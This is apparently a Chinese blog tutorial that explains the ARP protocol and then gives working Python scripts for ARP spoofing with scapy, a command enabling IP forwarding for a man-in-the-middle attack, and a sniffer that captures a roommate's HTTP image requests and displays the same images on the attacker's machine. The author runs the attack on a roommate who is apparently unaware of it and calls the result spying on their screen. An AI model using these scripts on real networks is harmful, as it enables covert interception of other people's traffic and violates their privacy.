 序

这篇文章研究了arp协议，并且利用python编程实现一次简单的局域网arp攻击，抓取室友网上浏览的图片（滑稽脸）

一、实战环境
kali2.0操作系统，本人用的32位的，装在vm12虚拟机中

python2.7.13，kali2.0自带

一个局域网和室友的电脑

kali所支持的无线网卡，型号为RT3070，某宝四十多就能能买到，主要用来抓取无线数据包，因为windows自带无线网卡kali不支持

选择kali支持的无线网卡可参考链接：http://www.freebuf.com/articles/wireless/140065.html
不过要注意一点，wn722n型号的无线网卡只有v1才支持kali，现在网上大多数卖的都是v2的，如果选择这一款买的时候要好好看一下，不要选错

二、arp协议研究
在进行arp攻击之前，先来研究一下arp协议

arp协议的全称为地址解析协议，是一种工作在网络层的协议，是一种将ip地址转换为MAC地址（物理地址）的协议

因为在OSI七层模型中，ip地址在第三层网络层，传送的是ip数据报，mac地址在第二层数据链路层，传送的是数据帧，二层的以太网交换设备并不能识别32位的IP地址，它们是以48位以太网地址（就是我们常说的MAC地址）传输以太网数据包（帧）的，局域网的机器要和其他机器进行通信，首先要获取对方的物理地址，所以arp协议便把ip地址转换为物理地址来实现这种对应关系

1.arp协议数据包
图片

op:1(op值为1说明这是一次arp请求)

hwsrc：发送方MAC地址（即本机器MAC地址）

psrc：发送方ip地址（即本机内网ip地址）

hwdst：目标MAC地址（在这里为未知00：00：00：00：00：00）

pdst：目标ip地址（即网关ip地址，一般为192.168.0.1/192.168.1.1）

局域网内所有机器接收此arp请求，如果发现请求的ip为自己的ip便会向请求机器发送arp响应，将自己的MAC地址带入arp响应包单播发送给请求的机器，arp响应包主要字段如下

op:2(op值为2说明这是一次arp响应)

hwsrc：发送方MAC地址（即网关MAC地址）

psrc：发送方ip地址（即网关ip地址）

hwdst：目标MAC地址（为发起arp请求的机器的MAC地址）

pdst：目标ip地址（为发起arp请求的机器的ip地址）

这样发起 arp 请求的机器从 arp 响应包里获取 MAC 地址并添加到本机 arp 缓存中，与网关进行通信，在这里要注意一点，在本机向网关发送 arp 请求的同时，网关也会向本机发送 arp 请求获取本机 MAC 地址，同时本机也会向网关发送 arp 响应，这时一个双向的过程，这里不再重复

接下来为了更清楚的理解，用 wireshark 抓包来观察一下 arp 请求包和响应包

选择抓包的网卡接口，在这选择wlan0，并向网关发起ping请求与网关通信，本机 ip 为192.168.0.106，网关ip为192.168.0.1  

图片

图片

在过滤窗口输入arp&&ip.addr==192.168.0.1将arp数据包过滤出来

图片

观察arp请求包和响应包是否和上述描述的一致，图中做出了详细标明

2.arp请求包
图片

3.arp响应包
图片

3.arp欺骗
上面描述完了arp协议，下面来说一下arp欺骗攻击，假设局域网内有三台机器

网关:192.168.0.1

受害者机器：192.168.0.108

本机kali：192.168.0.106

正常情况下，如果受害者和网关要进行通信，首先要使用arp协议进行对方的MAC地址获取，但是如果攻击者不断的向受害者发送arp响应包，告诉受害者网关的MAC地址为自己的MAC地址，包的大致内容如下

op:2(op值为2说明这是一次arp响应)

hwsrc：发送方MAC地址（攻击者MAC地址）

psrc：发送方ip地址（网关ip地址）

hwdst：目标MAC地址（受害者MAC地址）

pdst：目标ip地址（受害者ip地址）

在这里发送方ip是网关的ip，但是发送方MAC已经变为了攻击者（kali）的MAC地址，受害者不断的接收这个arp响应包，便会在自己的arp缓存中不断的更新错误的ip与MAC的对应关系，及网关的MAC为攻击者的MAC，由此攻击者的网卡便可以捕获到受害者到网关之间的流量，到现在实现了arp断网，受害者因为与错误的MAC地址进行通讯而上不了网，如果攻击者的机器开启了ip转发，便可以将从受害者截取到的流量转发出去给网关，实现arp欺骗，也称为中间人攻击

arp欺骗一般是双向欺骗，我们通过arp欺骗可以捕获到受害者到网关的流量，同样的我们可以向网关发送arp响应包欺骗网关受害者的MAC地址为自己的MAC地址，截获网关到受害者之间的流量，arp响应包大致如下

op:2(op值为2说明这是一次arp响应)

hwsrc：发送方MAC地址（攻击者MAC地址）

psrc：发送方ip地址（受害者ip地址）

hwdst：目标MAC地址（网关MAC地址）

pdst：目标ip地址（网关ip地址）

同样的网关在不断接受到此arp响应时也会不断的更新自己的arp缓存去建立错误的关系，我们的kali攻击机便可以双向的截获流量

4.用python实现arp攻击
所需的python第三方库

scapy库：scapy是一个可用于网络嗅探的非常强大的第三方库。可以伪造，嗅探或发送网络数据包，这这里我们使用scapy库伪造arp响应包并发送,首先安装scapy库，kali默认自带

pip install scapy
模拟攻击环境,一个真实的局域网，就是我们寝室

自己的kali攻击机:192.168.0.106,装在vm虚拟机中，连接了RT3070型号的无线网卡

室友的电脑:192.168.0.108，连接同一路由器的无线网

网关：192.168.0.1

5.编写python代码：
from scapy.all import *#导入scapy模块
from optparse import OptionParser#导入命令行参数处理模块optparse
import sys
def main():
    usage="Usage: [-i interface] [-t targetip] [-g gatewayip]"
    parser=OptionParser(usage)
    parser.add_option('-i',dest='interface',help='select interface(input eth0 or wlan0 or more)')#-i 所选择的网卡，eth0或wlan0，存放在interface变量中
    parser.add_option('-t',dest='targetip',help='select ip to spoof')#-t 要攻击的ip，存放在targetip变量中
    parser.add_option('-g',dest='gatewayip',help='input gateway ip')#-g 网关ip，存放在gatewayip变量中
    (options,args)=parser.parse_args()
    if options.interface and options.targetip and options.gatewayip:
        interface=options.interface
        tip=options.targetip
        gip=options.gatewayip
        spoof(interface,tip,gip)#将参数传给spoof函数
    else:
        parser.print_help()#显示帮助
        sys.exit(0)
def spoof(interface,tip,gip):#获取命令行的输入实现arp攻击
    localmac=get_if_hwaddr(interface)#get_if_hwaddr获取本地网卡MAC地址
    tmac=getmacbyip(tip)#根据目标ip获取其MAC地址
    gmac=getmacbyip(gip)#根据网关ip获取其MAC地址
    ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)#构造arp响应包，欺骗目标机器网关的MAC地址为本机MAC地址
    pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)#构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址
    try:
        while 1:
            sendp(ptarget,inter=2,iface=interface)
            print "send arp reponse to target(%s),gateway(%s) macaddress is %s"%(tip,gip,localmac)
            sendp(pgateway,inter=2,iface=interface)
            print "send arp reponse to gateway(%s),target(%s) macaddress is %s"%(gip,tip,localmac)#不断发送arp响应包欺骗目标机器和网关，直到ctrl+c结束程序
    except KeyboardInterrupt:
        sys.exit(0)
if __name__=='__main__':
    main()
6.脚本使用到的scapy库中的几个函数
get_if_hwaddr("本地网卡名称（eth0/wlan0）")    根据所选择的本地网卡获取相应的本地网卡的MAC地址
图片

getmacbyip（"ip地址"）    根据ip地址获取其MAC地址，使用该函数实际上使用了一次arp协议，可以用此函数获取网关和目标的MAC地址
图片

ARP是构建ARP数据包的类，Ether用来构建以太网数据包，构造arp数据包并加上以太网头部

Ether(src=本地网卡MAC,dst=目标机器MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=目标机器MAC,pdst=目标机器ip,op=2)
构造发送给目标机器的arp数据包，并加上以太网头部，欺骗目标机器网关的MAC为本机的MAC

Ether(src=本地网卡MAC,dst=网关MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=网关MAC,pdst=网关ip,op=2)
构造发送给网关的arp数据包，并加上以太网头部，欺骗网关目标机器的MAC为本机的MAC

sendp函数发送我们构造的arp数据包    sendp(数据包, inter=2, iface=网卡)    sendp函数工作在网络的第二层
以上代码实现了类似于arpspoof工具的功能，使用方法，进入脚本目录，输入

python arpattack.py -h
查看脚本使用帮助

Usage: [-i interface] [-t targetip] [-g gatewayip]

Options:
    -h, --help    show this help message and exit
    -i INTERFACE  select interface(input eth0 or wlan0 or more)
    -t TARGETIP   select ip to spoof
    -g GATEWAYIP  input gateway ip
所以我们这样输入可以双向的欺骗网关和目标机器完中间人攻击

python arpattack.py -i 网卡 -t 要攻击的目标的ip地址 -g 网关ip
输入

python arpattack.py -i wlan0 -t 192.168.0.8 -g 192.168.0.1
选择无线网卡wlan0的MAC地址去欺骗室友的电脑和网关路由器，如果我和室友都插了网线，就要选择eth0

运行脚本便会不断的向室友的电脑和网关发送arp响应包进行双向欺骗，效果如下   

图片

室友电脑 arp 缓存 

图片

路由器 arp 缓存   

图片

这时我们截获了室友电脑和网关之间的流量，使其不能相互通信，完成了arp断网

echo "1">/proc/sys/net/ipv4/ip_forward
开启流量转发，这时室友和网关正常通讯，但是流量会经过我们的网卡

接下来用python编写代码查看室友电脑浏览的网页图片，其实不难，因为浏览图片一般都是向服务器发送一次请求图片的http请求，所以只需从经过我们网卡的流量中过滤tcp80端口的数据包（http协议），将数据包的头部层层去掉，最后便能得到应用层的http数据包，在利用正则表达式将http://*.jpg筛选出来即可知道室友请求了哪些图片，python的pcap库和dpkt库可以使我们很容易的得到电脑网卡流量中的http应用层数据包

apt-get install libpcap-dev

pip install pypcap

pip install dpkt
安装pcap库和dpkt库

pcap模块的pcap方法可以返回一个用来捕获网卡数据包的pcap对象

dpkt，一个数据包解析工具，可以解析离线/实时pcap数据包

python代码如下stealimg.py

import pcap
import dpkt
import re
import requests
from PIL import Image
from io import BytesIO
from optparse import OptionParser
import sys
urllist=[]
def main():
    usage="Usage: [-i interface]"
    parser=OptionParser(usage)
    parser.add_option('-i',dest='interface',help='select interface(input eth0 or wlan0 or more)')
    (options,args)=parser.parse_args()
    if options.interface:
        interface=options.interface
        pc=pcap.pcap(interface)
        pc.setfilter('tcp port 80')
        for ptime,pdata in pc:
            getimg(pdata)
    else:
        parser.print_help()
        sys.exit(0)
def getimg(pdata):
    global urllist
    p=dpkt.ethernet.Ethernet(pdata)
    if p.data.__class__.__name__=='IP':
        if p.data.data.__class__.__name__=='TCP':
            if p.data.data.dport==80:
                pa=re.compile(r'GET (.*?\.jpg)')#|.*?\.png|.*?\.gif
                img=re.findall(pa,p.data.data.data)
                if img!=[]:
                    lines=p.data.data.data.split('\n')
                    for line in lines:
                        if 'Host:' in line:
                            url='http://'+line.split(':')[-1].strip()+img[-1]
                            if url not in urllist:
                                urllist.append(url)
                                if 'Referer:' in p.data.data.data:
                                    for line in lines:
                                        if 'Referer:' in line:
                                            referer=line.split(':')[-1].strip()
                                            print url
                                            r=requests.get(url,headers={'Referer':referer})
                                            img=Image.open(BytesIO(r.content))
                                            img.show()
                                else:
                                    r=requests.get(url)
                                    img=Image.open(BytesIO(r.content))
                                    img.show()
                            else:
                                pass
if __name__=='__main__':
    main()  
代码将pcap从本机网卡捕获到的完整的网络数据包使用dpkt库将其中封装的http应用层数据包提取出来，通过正则表达式将请求图片的http请求过滤出来，并在本机请求并输出，完成窥屏，效果如下:

用法 stealimg,py -i wlan0

室友电脑浏览图片

图片

自己kali可以窥屏

图片

注意一点，百度的图片爬取要在http请求头中加上Referer字段，否则会出现403禁止访问，代码只是简单的实现了窥屏的效果，还有着很多不足，不过通过这次学习可以对arp欺骗攻击有更深的理解
